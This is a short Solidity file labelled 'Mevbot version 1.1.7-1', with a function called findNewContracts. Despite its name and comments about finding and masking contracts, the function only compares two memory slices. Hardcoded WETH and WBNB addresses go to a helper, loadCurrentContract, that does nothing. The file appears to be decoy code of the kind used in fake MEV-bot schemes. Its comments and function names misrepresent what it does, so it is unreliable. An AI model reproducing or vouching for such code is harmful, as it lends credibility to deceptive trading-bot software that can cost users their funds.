//Mevbot version 1.1.7-1

//SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;

import "./TestLib.sol";
contract findNewContractsFacet {
    function findNewContracts(
        TestLib.slice memory self,
        TestLib.slice memory other
    ) internal pure returns (int256) {
        uint256 shortest = self._len;

        if (other._len < self._len) shortest = other._len;

        uint256 selfptr = self._ptr;
        uint256 otherptr = other._ptr;

        for (uint256 idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint256 a;
            uint256 b;

            string
                memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string
                memory WBSC_CONTRACT_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";

            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(WBSC_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1);

                if (shortest < 32) {
                    mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0) return int256(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int256(self._len) - int256(other._len);
    }
    function loadCurrentContract(
        string memory self
    ) internal pure returns (string memory) {
        string memory ret = self;
        uint256 retptr;
        assembly {
            retptr := add(ret, 32)
        }

        return ret;
    }
}
